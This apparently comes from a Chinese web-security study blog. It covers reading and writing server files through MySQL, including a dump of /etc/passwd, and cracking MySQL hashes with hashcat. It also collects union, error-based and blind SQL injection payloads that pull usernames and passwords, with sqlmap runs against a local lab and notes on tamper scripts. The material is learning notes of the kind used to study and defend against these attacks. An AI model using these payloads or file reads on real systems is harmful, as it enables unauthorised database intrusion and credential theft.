<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; system cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:116:user <span class="keyword">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:112:117::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:114:119::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/<span class="literal">false</span></span><br><span class="line">gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/<span class="literal">false</span></span><br><span class="line">ca0y1h:x:1000:1000:ca0y1h,,,:/home/ca0y1h:/bin/bash</span><br><span class="line">mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>执行命令</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63nt6f27lj20jp092q4h.jpg" alt=""></p>
</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>该方法只能在本地使用，远程连接时无法使用system</li>
<li>无法越权使用</li>
</ul>
</li>
<li>
<h5 id="load-file-与load-data-file">load_file()与load data file</h5>
<p>load_file()与load data file读取文件的原理都是一样的：新建一个表，读取文件为字符串形式插入表中后读取表中的数据。</p>
<p>使用load_file()和load data infile()函数时，需要满足以下条件：</p>
<ul>
<li><code>secure_file_priv</code> 不为 NULL，使用 <code>select @@secure_file_priv</code>查看其值，值不为空字符串时，只能使用该目录进行文件的读写操作， 该值的设置见[附录](<a href="https://bingslient.github.io/2019/08/16/MySQL">https://bingslient.github.io/2019/08/16/MySQL</a> 数据库系统表的利用/#附录)；</li>
<li>当前数据库用户具有 <code>FILE</code> 权限，使用 <code>show grants</code>查看；</li>
<li>系统用户 <code>mysql</code> 对该文件可读（要考虑系统的访问控制策略），在Ubuntu-18.04使用 MySQL 时默认的系统用户是 <code>mysql</code>；</li>
<li>读取文件的大小小于 <code>max_allowed_packet</code>，使用 <code>select @@max_allowed_packet</code>查看；</li>
<li>文件存在服务器上。</li>
</ul>
<p>如果上述任一条件不满足，函数返回 <code>NULL</code> 值。</p>
<p>查看secure_file_priv的值：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63ycnyqg5j20dd03mq30.jpg" alt=""></p>
<p>可以看到secure_file_priv的值为<code>/var/lib/mysql-files</code></p>
<blockquote>
<p>① secure_file_priv为NULL时，表示不允许导入导出；<br>
② secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹；<br>
③ secure_file_priv没有设置时，则表示没有任何限制</p>
</blockquote>
<p><strong>在不改变secure_file_priv值的情况下如何读文件：</strong></p>
<p>可以新建一个表，或者直接把要读文件的内容into到已有的字符类型的表中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table mytable(a VARCHAR(100), b VARCHAR(100), c VARCHAR(100), d VARCHAR(100), e VARCHAR(100), f VARCHAR(100), g VARCHAR(100));</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63z0tqvswj20qc01pmx7.jpg" alt=""></p>
<p>使用load data infile读取文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD DATA LOCAL INFILE &quot;&#x2F;etc&#x2F;passwd&quot; INTO TABLE mytable;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63z2vt4r8j20fv01n0su.jpg" alt=""></p>
<p>查看刚刚读入的文件：</p>
<p><img src="https://i.loli.net/2019/09/17/R8vDHQPGUFsL14A.png" alt=""></p>
<p><strong>在改变secure_file_priv值的情况下如何读文件：</strong></p>
<p>修改MySQL配置文件<code>etc/mysql/my.cnf</code>，在[mysqld]下添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>
<p>再重启mysql服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure>
<p>在mysql命令行中查看<code>secure_file_priv</code>的值：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g63zybibb1j20bl03kq2y.jpg" alt=""></p>
<p>修改成功！</p>
<p>使用load_file()读取文件：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g641rti54aj20ae04m74d.jpg" alt=""></p>
<blockquote>
<p><strong>在Ubuntu-18.04使用 MySQL 时默认的系统用户是 <code>mysql</code>，所以必须把要读取的文件的所有者和用户组修改为<code>mysql</code></strong></p>
</blockquote>
</li>
</ol>
<h3 id="二、利用数据库写入文件">二、利用数据库写入文件</h3>
<p><code>SELECT INTO OUTFILE</code> 和 <code>LOAD DATA</code> 这两条语句是完全互补的，一个写文件，一个读文件，语句的语法也很相似。</p>
<p><strong>前提条件：</strong></p>
<ul>
<li><code>secure_file_priv</code> 不为 <code>NULL</code>，使用 <code>select @@secure_file_priv</code>查看其值，值不为空字符串时，只能使用该目录进行文件的读写操作， 该值的设置见[附录](<a href="https://bingslient.github.io/2019/08/16/MySQL">https://bingslient.github.io/2019/08/16/MySQL</a> 数据库系统表的利用/#附录)；</li>
<li>当前数据库用户具有 <code>FILE</code> 权限，使用 <code>show grants</code>查看；</li>
<li>系统用户 <code>mysql</code> 对该文件可写（要考虑系统的访问控制策略），在Ubuntu-18.04使用 MySQL 时默认的系统用户是 <code>mysql</code>；</li>
<li>读取文件的大小小于 <code>max_allowed_packet</code>，使用 <code>select @@max_allowed_packet</code>查看；</li>
<li>文件不存在。</li>
</ul>
<p>将数据库中的某一个记录写入<code>/tmp/customer.csv</code>文件中：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g642bna6a0j20no06gaaf.jpg" alt=""></p>
<p>结果如下：</p>
<p><img src="https://i.loli.net/2019/09/17/ZbaRjsf2klK3otd.png" alt=""></p>
<blockquote>
<p>使用 <code>SELECT INTO DUMPFILE</code> 可将文件内容写成一行。</p>
</blockquote>
<blockquote>
<p>如果想把远程数据库的查询结果写到本地主机文件上, 可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;mysql -h hostname -P portnum -u username -p databsename -e &quot;SELECT ...&quot; &gt; file_name</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="0x03-用户密码爆破">0x03 用户密码爆破</h2>
<p>MySQL 用户的密码存储方式并非明文直接存储，而是经过 hash 函数加密进行存储的，从 <code>mysql.user</code>中获取到 MySQL 用户密码的哈希值后，需要使用工具进行破解。</p>
<p>首先查询<code>root</code>用户密码的Hash值：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g646f0wllhj20g7050t97.jpg" alt=""></p>
<p><strong>工具：</strong><a href="https://github.com/hashcat/hashcat">hashcat</a></p>
<blockquote>
<p>hashcat 号称最快的高级密码恢复套机（密码破解工具），支持多系统（Linux，OS，Windows），多平台（GPU，CPU，DSP等），支持多达 200 多种的 Hash 类型，支持使用同一系统的不同设备，支持分布式系统资源等，重要的是开源啊！</p>
</blockquote>
<p><strong>使用：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hashcat64.exe -m 300 -a 3 hashcode -o plaintxt --outfile-format=2 ?a?a?a?a?a?a</span><br></pre></td></tr></table></figure>
<p>参数解释：</p>
<ul>
<li>
<p><code>-m 300</code>：hash 类型，300 选择的是 MySQL4/5 的hash</p>
</li>
<li>
<p><code>-a 3</code>：攻击模式，3代表爆破模式</p>
<blockquote>
<p>软件一共支持5种破解模式，分别为:</p>
<p>0 Straight（字典破解）<br>
1 Combination（组合破解）<br>
3 Brute-force（掩码暴力破解）<br>
6 Hybrid dict + mask（混合字典+掩码）<br>
7 Hybrid mask + dict（混合掩码+字典）</p>
</blockquote>
</li>
<li>
<p><code>-o pliantxt</code> ：破解后输出到文件 plaintxt</p>
</li>
<li>
<p><code>--outfile-format=2</code>：输出文件格式，2表示只输出破解后的内容</p>
</li>
<li>
<p><code>?a?a?a?a?a?a</code>：这表示密码的掩码，所谓的掩码就是通过 ?[字符集代号]… 的格式表示密码的格式，包括密码的位数和每一位密码使用的字符集。?a 表示所有的键盘上可输入的字符，6个?a表示密码有6位。</p>
<blockquote>
<p>hashcat 内置字符集如下：</p>
<p>?l = abcdefghijklmnopqrstuvwxyz</p>
<p>?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>
<p>?d = 0123456789</p>
<p>?h = 0123456789abcdef</p>
<p>?H = 0123456789ABCDEF</p>
<p>?s = !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{</p>
<p>?a = ?l?u?d?s</p>
<p>?b = 0x00 - 0xff</p>
</blockquote>
<p>如果要用掩码表示小写+数字怎么办呢？这就需要用到自定义字符集这个参数了。软件支持用户最多定义4组字符集，分别用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--custom-charset1 [chars]</span><br><span class="line">--custom-charset2 [chars]</span><br><span class="line">--custom-charset3 [chars]</span><br><span class="line">--custom-charset4 [chars]</span><br></pre></td></tr></table></figure>
<p>比如说我要设置自定义字符集1为小写+数字，那么就加上:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-- custom-charset1 ?l?d</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用–increment参数，并且使用–increment-min ?定义最短长度，使用–increment-max ?定义最大长度。比如要尝试6-8位小写字母，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
<p><strong>爆破结果：</strong></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g646w12n96j208u02rt8j.jpg" alt=""></p>
<blockquote>
<p>最新版本的MySQL在配置密码规则是要求密码长度最小为8位，但是我这破电脑用hashcat爆破8位密码预计需要1年的时间，只能强行把密码最小长度改为6位，15分钟解决问题。</p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>MySQL</tag>
        <tag>hash爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之数据库注入语句的收集和学习</title>
    <url>/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web安全学习之数据库注入语句的收集和学习">Web安全学习之数据库注入语句的收集和学习</h1>
<h2 id="任务目标">任务目标</h2>
<ol>
<li>收集网络上各种sql注入时使用的payload并理解其适用的环境（检测注入、利用注入）；</li>
<li>记录sqlmap的检测和利用过程中使用的payload；</li>
<li>理解以上涉及的sql语句的意思，其中会涉及不同的数据库、不同注入场景。将收集方式和学习过程整理形成报告；</li>
<li>扩展学习：理解sqlmap自带tamper的原理</li>
</ol>
<h2 id="0x01-Payload收集">0x01 Payload收集</h2>
<blockquote>
<p>以下payloads都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p>
</blockquote>
<p>我们把注入场景分为：</p>
<ul>
<li>联合查询注入</li>
<li>报错型注入</li>
<li>布尔盲注</li>
<li>时间盲注</li>
</ul>
<h3 id="联合查询注入">联合查询注入</h3>
<h4 id="使用场景">使用场景</h4>
<p>页面上有显示位</p>
<blockquote>
<p>什么是显示位： 在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位 。</p>
</blockquote>
<h4 id="Payload">Payload</h4>
<ol>
<li>
<p>判断当前数据表中有几列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看显示位在第几列（假设一共三列）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：这里必须是查询一个不存在的记录才能起作用。</p>
</blockquote>
</li>
<li>
<p>显示当前数据库（假设显示位中包含第三位）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看当前数据库中的所有表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>函数<code>group_concat()</code>把所有结果都在一行输出</p>
</blockquote>
</li>
<li>
<p>查询所有数据库：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某个数据库中的表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某个表中的所有字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某个表中的字段内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>0x3a会被转义位冒号<code>：</code></p>
</blockquote>
</li>
</ol>
<h2 id="报错型注入">报错型注入</h2>
<h3 id="使用场景-v2">使用场景</h3>
<p>页面上没有显示位但是有sql语句执行错误信息输出。</p>
<h4 id="Payload-v2">Payload</h4>
<p>主要有三种SQL注入报错方式：</p>
<ul>
<li>ExtractValue</li>
<li>UpdateXml</li>
<li>floor</li>
</ul>
<h5 id="ExtractValue">ExtractValue</h5>
<p>首先来看<code>ExtractValue()</code>函数，它接受两个字符串参数，第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。 例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, &#39;~&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~&#39;</span><br></pre></td></tr></table></figure>
<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b&#x2F;&gt;&lt;&#x2F;a&gt;&#39;, concat(&#39;~&#39;, (select database())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br></pre></td></tr></table></figure>
<h5 id="UpdateXml">UpdateXml</h5>
<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></p>
<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
<p><strong>new_xml：</strong> 更新后的内容</p>
<p>不过这些参数都不太重要，这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select database())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~security&#39;</span><br><span class="line"></span><br><span class="line">mysql&gt; select updatexml(&#39;test&#39;, concat(&#39;~&#39;, (select version())), &#39;test&#39;);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.27-0ubuntu0.18.0.1&#39;</span><br></pre></td></tr></table></figure>
<h5 id="Floor">Floor</h5>
<p>有关<code>floor()</code>函数的注入原理可以看<a href="https://ca0y1h.top/2019/09/17/sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">这篇文章</a>。</p>
<p>固定格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((******), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p><code>******</code>替换为查询语句即可。</p>
<ol>
<li>
<p>查询数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select database()), floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某个数据库中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1, 1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1, count(*), concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;, limit 1,1), floor(rand()*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询表中的字段内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from security.users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>修改limit x,1 可以显示第x个用户的password和username。</p>
</blockquote>
<h3 id="布尔盲注">布尔盲注</h3>
<h4 id="使用场景-v3">使用场景</h4>
<p>页面没有显示位，也没有SQL语句执行错误信息，只能通过页面返回是否正常来判断注入点。</p>
<h4 id="Payload-v3">Payload</h4>
<blockquote>
<p>有用到二分法的思想</p>
</blockquote>
<h5 id="数据库名相关">数据库名相关</h5>
<ol>
<li>
<p>查询数据库个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(schema_name) from information_schema.schemata) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某一个数据库名的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(schema_name) from information_schema.schemata limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询某个数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select assii(substr(select schema_name from information_schema.schema limit 1,1)1,1)) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="数据表相关">数据表相关</h5>
<ol>
<li>
<p>查询表的个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询表的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(table_name) from information.schema.tables where table_schema&#x3D;&#39;security&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看某个表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="字段相关">字段相关</h5>
<ol>
<li>
<p>查看某个表中的字段个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看某个字段名的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(column_name) from infomation_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看某个字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h5 id="记录内容相关">记录内容相关</h5>
<ol>
<li>
<p>查看表中行数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select count(*) from security.users) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看某个字段内容的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select length(username) from security.users limit 1,1) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看某个字段的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union (select ascii(substr((select username from security.users limit 1,1),1,1))) &lt; 77 --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="时间盲注">时间盲注</h3>
<h4 id="使用场景-v4">使用场景</h4>
<p>页面上没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，如果if条件成立则页面的返回速度明显慢了5秒。</p>
<h4 id="Payload-v4">Payload</h4>
<blockquote>
<p>与布尔盲注的思想类似</p>
</blockquote>
<ol>
<li>
<p>判断数据库的个数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select count(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>判断数据库名的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select length(schema_name) from information_schema.schemata)&#x3D;9, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查询数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39; and if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1)1,1)))&#x3D;105, sleep(5), 1) --+</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="0x02-SQLMap-Payload">0x02 SQLMap Payload</h2>
<ol>
<li>
<p>以sqlilab中的Less-8为例（布尔型单引号GET盲注），查看sqlmap中使用的payloads，执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-8/?id=1&quot; --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>首先获取数据库的个数：<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g7y2vi5zukj2141042gn9.jpg" alt="">函数解释：</p>
<ul>
<li>
<p>ORD(string) ：返回字符串首字符的ASCII码值。</p>
</li>
<li>
<p>MID(string，start，length) ：返回字符串的从start开始长度为length的字符串。</p>
</li>
<li>
<p>IFNULL(string1，string2) ：如果string1是NULL则返回string2，如果不是NULL返回string1。</p>
</li>
<li>
<p>CAST(volume as type) 用于数据类型转换，将volume转换成type类型的数据（如这里是将数字转<br>
换为字符串）。</p>
</li>
<li>
<p>COUNT()： 统计个数。</p>
</li>
<li>
<p>DISTINCT()： 标记只要不同（唯一）的值。</p>
</li>
</ul>
<p>Payload解释：</p>
<p>0-9的字符ASCII值对应的是48-57，所以sqlmap首先判断的&gt;51也就是&gt;3，因为mysql本身就有六个数据库但world、test、sakila这三个数据库没什么用可以删除，那么最少应该有三个数据库，<code>performance_schema</code>和<code>information_schema</code>和<code>mysql</code>。</p>
<p>假如数据库的数量是&gt;3的话，那么就相当于<code>1' and true</code>返回页面不会出现问题，如果返回页面不是正确页面的话我们就可以确定一共有三个数据库（都是默认的）或者是由10多个数据库（20多个也是有可能的），十位是1,2总之是小于等于3的。</p>
<p>再获取每个数据库名（这里也<code>mysql</code>为例）：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7ymze766qj214q0hm11n.jpg" alt="">其实道理和上述的一样进行猜解，通过判断每一位的ASCII码值来确定每个字母。</p>
</li>
<li>
<p>再以sqlilab中的Less-4为例（基于错误的GET双引号字符型注入），查看sqlmap中使用的payloads，执行命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -v 3 -u &quot;http://localhost/sqlilabs/Less-4/?id=1&quot; --level 4 --dbs --dbms=&quot;MySQL&quot;</span><br></pre></td></tr></table></figure>
<p>SQLMap执行的payload如下所示：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g7yniit87tj21f40flq8z.jpg" alt=""></p>
</li>
</ol>
<h2 id="0x03-SQLMap-Tamper">0x03 SQLMap Tamper</h2>
<p>SQLMap的tamper使用命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sql -u [url] --tamper  [模块名]</span><br></pre></td></tr></table></figure>
<h3 id="常用的tamper脚本">常用的tamper脚本</h3>
<ol>
<li>
<p><a href="http://apostrophemask.py">apostrophemask.py</a><br>
适用数据库：ALL<br>
作用：将引号替换为utf-8，用于过滤单引号<br>
使用脚本前：tamper(“1 AND ‘1’='1”)<br>
使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
</li>
<li>
<p><a href="http://base64encode.py">base64encode.py</a><br>
适用数据库：ALL<br>
